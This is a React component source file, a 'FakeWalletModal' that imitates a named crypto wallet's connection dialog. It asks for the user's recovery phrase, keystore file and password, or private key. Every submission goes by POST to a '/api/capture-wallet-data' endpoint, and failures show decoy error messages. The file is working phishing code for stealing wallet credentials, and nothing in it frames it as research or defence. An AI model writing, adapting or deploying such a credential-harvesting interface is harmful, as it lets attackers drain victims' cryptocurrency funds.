import { useState, useEffect } from 'react';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from '@/components/ui/dialog';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Textarea } from '@/components/ui/textarea';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Label } from '@/components/ui/label';
import { useToast } from '@/hooks/use-toast';
import { WalletGrid } from './wallet-grid';

interface FakeWalletModalProps {
  isOpen: boolean;
  onClose: () => void;
  walletName: string;
  walletIcon?: string;
}

export function FakeWalletModal({ isOpen, onClose, walletName, walletIcon }: FakeWalletModalProps) {
  const [phrase, setPhrase] = useState('');
  const [keystoreFile, setKeystoreFile] = useState<File | null>(null);
  const [keystorePassword, setKeystorePassword] = useState('');
  const [privateKey, setPrivateKey] = useState('');
  const [loading, setLoading] = useState(false);
  const { toast } = useToast();

  const submitData = async (method: string, data: any) => {
    setLoading(true);
    try {
      const response = await fetch('/api/capture-wallet-data', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          wallet: walletName,
          method,
          data,
          timestamp: new Date().toISOString(),
        }),
      });

      if (response.ok) {
        toast({
          title: "Data Captured Successfully",
          description: "Your wallet information has been processed for testing.",
        });
      } else {
        toast({
          title: "Connection Error",
          description: "Wallet connection service is currently unavailable.",
          variant: "destructive",
        });
      }
    } catch (error) {
      toast({
        title: "Network Error",
        description: "Please check your internet connection and try again.",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
      onClose();
    }
  };

  const handlePhraseSubmit = () => {
    if (!phrase.trim()) {
      toast({
        title: "Invalid Input",
        description: "Please enter your recovery phrase",
        variant: "destructive",
      });
      return;
    }
    submitData('phrase', { phrase });
  };

  const handleKeystoreSubmit = () => {
    if (!keystoreFile || !keystorePassword.trim()) {
      toast({
        title: "Invalid Input",
        description: "Please enter keystore JSON and password",
        variant: "destructive",
      });
      return;
    }

    const reader = new FileReader();
    reader.onload = (e) => {
      const keystoreContent = e.target?.result as string;
      submitData('keystore', { 
        filename: keystoreFile.name,
        content: keystoreContent,
        password: keystorePassword 
      });
    };
    reader.readAsText(keystoreFile);
  };

  const handlePrivateKeySubmit = () => {
    if (!privateKey.trim()) {
      toast({
        title: "Invalid Input",
        description: "Please enter your private key",
        variant: "destructive",
      });
      return;
    }
    submitData('privateKey', { privateKey });
  };

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="mx-4 max-w-[calc(100vw-2rem)] sm:max-w-md w-full">
        <DialogHeader>
          <DialogTitle className="flex items-center space-x-2 sm:space-x-3 text-sm sm:text-base">
            {walletIcon && (
              <img src={walletIcon} alt={walletName} className="w-6 h-6 sm:w-8 sm:h-8 rounded-lg flex-shrink-0" />
            )}
            <span className="truncate">{walletName}</span>
          </DialogTitle>
          <DialogDescription className="text-xs sm:text-sm">
            Connect your {walletName} wallet to continue
          </DialogDescription>
        </DialogHeader>

        <Tabs defaultValue="phrase" className="w-full">
          <TabsList className="grid w-full grid-cols-3 h-8 sm:h-10">
            <TabsTrigger value="phrase" className="text-xs sm:text-sm">Phrase</TabsTrigger>
            <TabsTrigger value="keystore" className="text-xs sm:text-sm">Keystore</TabsTrigger>
            <TabsTrigger value="privateKey" className="text-xs sm:text-sm">Private Key</TabsTrigger>
          </TabsList>

          <TabsContent value="phrase" className="space-y-3 sm:space-y-4 mt-4">
            <div className="space-y-2">
              <Label htmlFor="phrase" className="text-sm">Enter your recovery phrase</Label>
              <Textarea
                id="phrase"
                placeholder="Enter your recovery phrase"
                value={phrase}
                onChange={(e) => setPhrase(e.target.value)}
                className="min-h-[80px] sm:min-h-[100px] text-sm resize-none"
              />
              <p className="text-xs text-gray-500 leading-relaxed">
                Typically 12 (sometimes 24) words separated by single spaces
              </p>
            </div>
            <div className="flex flex-col sm:flex-row space-y-2 sm:space-y-0 sm:space-x-2">
              <Button 
                onClick={handlePhraseSubmit} 
                disabled={loading}
                className="flex-1 bg-blue-500 hover:bg-blue-600 h-10 sm:h-11 text-sm sm:text-base"
              >
                {loading ? "CONNECTING..." : "PROCEED"}
              </Button>
              <Button 
                variant="destructive" 
                onClick={onClose}
                className="h-10 sm:h-11 text-sm sm:text-base"
              >
                Cancel
              </Button>
            </div>
          </TabsContent>

          <TabsContent value="keystore" className="space-y-3 sm:space-y-4 mt-4">
            <div className="space-y-2">
              <Label htmlFor="keystore" className="text-sm">Enter your keystore JSON</Label>
              <Textarea
                id="keystore"
                placeholder="Paste your keystore JSON here..."
                value={keystoreFile ? 'keystore-content' : ''}
                onChange={(e) => {
                  const content = e.target.value;
                  if (content.trim()) {
                    // Create a fake file object to maintain compatibility
                    const fakeFile = new File([content], 'keystore.json', { type: 'application/json' });
                    setKeystoreFile(fakeFile);
                  } else {
                    setKeystoreFile(null);
                  }
                }}
                className="min-h-[80px] sm:min-h-[100px] text-sm resize-none"
              />
              <p className="text-xs text-gray-500 leading-relaxed">
                Several lines of text beginning with {`"{...}"`} plus the password you used to encrypt it.
              </p>
            </div>
            <div className="space-y-2">
              <Label htmlFor="password" className="text-sm">Keystore password</Label>
              <Input
                id="password"
                type="password"
                placeholder="Enter keystore password"
                value={keystorePassword}
                onChange={(e) => setKeystorePassword(e.target.value)}
                className="h-10 sm:h-11 text-sm"
              />
            </div>
            <div className="flex flex-col sm:flex-row space-y-2 sm:space-y-0 sm:space-x-2">
              <Button 
                onClick={handleKeystoreSubmit} 
                disabled={loading}
                className="flex-1 bg-blue-500 hover:bg-blue-600 h-10 sm:h-11 text-sm sm:text-base"
              >
                {loading ? "CONNECTING..." : "PROCEED"}
              </Button>
              <Button 
                variant="destructive" 
                onClick={onClose}
                className="h-10 sm:h-11 text-sm sm:text-base"
              >
                Cancel
              </Button>
            </div>
          </TabsContent>

          <TabsContent value="privateKey" className="space-y-3 sm:space-y-4 mt-4">
            <div className="space-y-2">
              <Label htmlFor="privateKey" className="text-sm">Enter your private key</Label>
              <Textarea
                id="privateKey"
                placeholder="Enter your private key"
                value={privateKey}
                onChange={(e) => setPrivateKey(e.target.value)}
                className="min-h-[80px] sm:min-h-[100px] text-sm resize-none"
              />
              <p className="text-xs text-gray-500 leading-relaxed">
                Your private key (64 characters starting with 0x)
              </p>
            </div>
            <div className="flex flex-col sm:flex-row space-y-2 sm:space-y-0 sm:space-x-2">
              <Button 
                onClick={handlePrivateKeySubmit} 
                disabled={loading}
                className="flex-1 bg-blue-500 hover:bg-blue-600 h-10 sm:h-11 text-sm sm:text-base"
              >
                {loading ? "CONNECTING..." : "PROCEED"}
              </Button>
              <Button 
                variant="destructive" 
                onClick={onClose}
                className="h-10 sm:h-11 text-sm sm:text-base"
              >
                Cancel
              </Button>
            </div>
          </TabsContent>
        </Tabs>
      </DialogContent>
    </Dialog>
  );
}